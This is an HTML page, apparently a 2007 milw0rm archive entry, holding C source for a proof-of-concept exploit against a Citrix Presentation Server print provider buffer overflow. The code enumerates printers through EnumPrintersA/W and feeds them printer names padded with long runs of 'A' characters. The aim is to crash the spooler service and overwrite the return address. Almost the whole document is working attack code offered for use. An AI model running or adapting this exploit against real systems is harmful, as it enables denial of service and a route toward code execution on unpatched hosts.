<html><head><title>Citrix Metaframe Presentation Server Print Provider Buffer Overflow PoC</title></head><pre>/*
 Proof of concept exploit for ZDI - Citrix Metaframe spooler service vulnerability
 Microsoft Windows - EnumPrinter() &amp; EnumPrinterW() Fuzzer v0.1 
 Author: Andres Tarasco Acuña - atarasco@514.es
 url: http://www.514.es

 This is an intial version of EnumPrinter() and OpenPrinter() fuzzer. I hope that 
 it will help to identify similar vulnerabilities.
 Tested against win2k3 + Citrix presentation server. If the system is vulnerable 
 this application will kill spooler service (spoolsv.exe ) and ret will be overwritten
 with 0x00410041
 
 514 Tiger Team ownz u

 */
#include &lt;stdio.h&gt;
#include &lt;windows.h&gt;
#include &lt;Winspool.h&gt;
#pragma comment(lib,&quot;Winspool.lib&quot;)


void usage(char *name) {
      printf(&quot;Usage: %s -a (Ascii fuzzing for local printer providers)\n&quot;,name);
      printf(&quot;Usage: %s -u (Unicode fuzzing for local printer providers)\n&quot;,name);
      exit(0);
}

#define RECURSIVE 1
#define OPT_UNICODE 2
#define MAX_PRINTER_LEN 4096

#define _DBG_
#undef _DBG_

int CustomFuzzSize[]= {25,50,100,150,250,300,500,1000,1500, 2000};
wchar_t dst[MAX_PRINTER_LEN];



void Fuzzer( wchar_t *orig,int opt, int unicode) {
   int i,j;
   int len;

   if (unicode) len=wcslen(orig); 
   else len=strlen((char *)orig);
   memset((char *)dst,'\0',sizeof(dst));
   memcpy((char *)dst,orig,len*(1+unicode));
   j=wcslen(orig);
   for(i=0;i&lt;CustomFuzzSize[opt];i++) {
      if (unicode) dst[j+i]='A';
      else ((char *)dst)[j+i]=(char)'A';
   }

   if (opt==0) {
   if (unicode)
   printf(&quot;Fuzzing: %S ( %i -%i)\n&quot;,dst,CustomFuzzSize[0],CustomFuzzSize[sizeof(CustomFuzzSize)/sizeof(int)-1]);
   else printf(&quot;Fuzzing: %s ( %i -%i)\n&quot;,dst,CustomFuzzSize[0],CustomFuzzSize[sizeof(CustomFuzzSize)/sizeof(int)-1]);
   }
   
}


DWORD ShowPrinterInfo(wchar_t *lpName,  int level, int opt, char *padding) {

   unsigned char *lpInfo;
   int i,j;
   DWORD n;
   DWORD dwSizeNeeded=0;
   char newpadding[50];

   DWORD ret;

   if (opt &amp; OPT_UNICODE) {
      EnumPrintersW ( PRINTER_ENUM_NAME, (wchar_t* )lpName, level, NULL, 0, &amp;dwSizeNeeded, &amp;n );
   } else {
      EnumPrintersA ( PRINTER_ENUM_NAME, (char *)lpName, level, NULL, 0, &amp;dwSizeNeeded, &amp;n );
   }
   if (dwSizeNeeded==0) {    
#ifdef _DBG_
      printf ( &quot;EnumPrintersX() Invalid. Error: %d \n&quot;,GetLastError() );
#endif
      return(-1);
   }

   lpInfo = (void *)HeapAlloc ( GetProcessHeap (), HEAP_ZERO_MEMORY, dwSizeNeeded );

   if ( lpInfo != NULL ) {
         if (opt &amp; OPT_UNICODE) {
            ret=EnumPrintersW ( PRINTER_ENUM_NAME,(wchar_t *)lpName,level,(LPBYTE)lpInfo,dwSizeNeeded,&amp;dwSizeNeeded,&amp;n);
         } else {
            ret=EnumPrintersA ( PRINTER_ENUM_NAME,(char *)lpName,level,(LPBYTE)lpInfo,dwSizeNeeded,&amp;dwSizeNeeded,&amp;n);
         }
      if (  ret== 0 )
	   {
#ifdef _DBG_
		   printf ( &quot;EnumPrintersX() Failed. Error: %d ( %i)\n&quot;,GetLastError(),dwSizeNeeded  );
#endif
         HeapFree ( GetProcessHeap (), 0, lpInfo );
		   return 0;
      } else {
         PRINTER_INFO_1 *dataI;
         PRINTER_INFO_2 *dataII;
         
	      for ( i=0; i &lt; n; i++ ) {
               dataI=(PRINTER_INFO_1*)lpInfo;
             
               printf(&quot;%s&quot;,padding);
               if (opt &amp; OPT_UNICODE) {
                  if (dataI[i].pName)  printf(&quot; %S - &quot;,(dataI[i].pName));
                  if (dataI[i].pDescription)  printf(&quot; %S &quot;,(dataI[i].pDescription));
                  //if (dataI[i].pComment)  printf(&quot; %S - &quot;,(dataI[i].pComment));
               } else {
                  if (dataI[i].pName)  printf(&quot; %s - &quot;,(dataI[i].pName));
                  if (dataI[i].pDescription)  printf(&quot; %s &quot;,(dataI[i].pDescription));
                  //if (dataI[i].pComment)  printf(&quot; %s - &quot;,(dataI[i].pComment));
               }
                  printf(&quot;\n&quot;);
              for(j=0;j&lt;sizeof(CustomFuzzSize)/sizeof(int);j++) {
                 if (opt &amp; OPT_UNICODE) {
                    Fuzzer( (wchar_t *) dataI[0].pName, j,opt &amp; OPT_UNICODE);
                    ShowPrinterInfo((wchar_t*)dst,level, OPT_UNICODE, newpadding);            
                 } else {
                    Fuzzer( (wchar_t *) dataI[0].pName, j,opt &amp; OPT_UNICODE);
                     ShowPrinterInfo((wchar_t*)dst,level, 0, newpadding);            
                 }
               }
               if (opt &amp; RECURSIVE ) {
                  strcpy (newpadding,padding);
                  strcat(newpadding,&quot;---&quot;);
                  newpadding[1]='+';
                  ShowPrinterInfo(dataI[i].pName,level, opt, newpadding);
               }
               printf(&quot;\n&quot;);
         }
         HeapFree ( GetProcessHeap (), 0, lpInfo );
      }
   }

   return(1);
}

int testPrinters(void) {
   DWORD size,ret,err;
   ret=EnumPrintersW ( PRINTER_ENUM_NAME, NULL, 1, NULL, 0, &amp;size, &amp;size );
      if (  ret==0 ) {
         err=GetLastError();
         if (err!=122) { //size error
            printf(&quot;[-] Printer Service not available - Error: %d\n&quot;,err );         
            exit(-1);
         }
      } 
      return(1);
}
int main ( int argc, char *argv[] )
{

   printf(&quot;[+] Citrix Presentation Server - Local EnumPrinterW() POC exploit\n&quot;);
   printf(&quot;[+] Discovered by ZDI - http://secunia.com/advisories/23869/\n&quot;);
   printf(&quot;[+] Proof of concept by Andres Tarasco - atarasco@514.es\n\n&quot;);

   if (argc!=2) usage(argv[0]);

   testPrinters();
   printf(&quot;[+] Printer Service Seems to be working.. Fuzzing\n&quot;);
 
   if ( (argv[1][1]=='u'))  { 
      ShowPrinterInfo(NULL,1,3,&quot;[*]&quot;);
      testPrinters();
   }
   if ( (argv[1][1]=='a'))  {
      ShowPrinterInfo(NULL,1,1,&quot;[*]&quot;);
      testPrinters();
   }
   

   return(0);
 } 

// milw0rm.com [2007-01-26]</pre></html>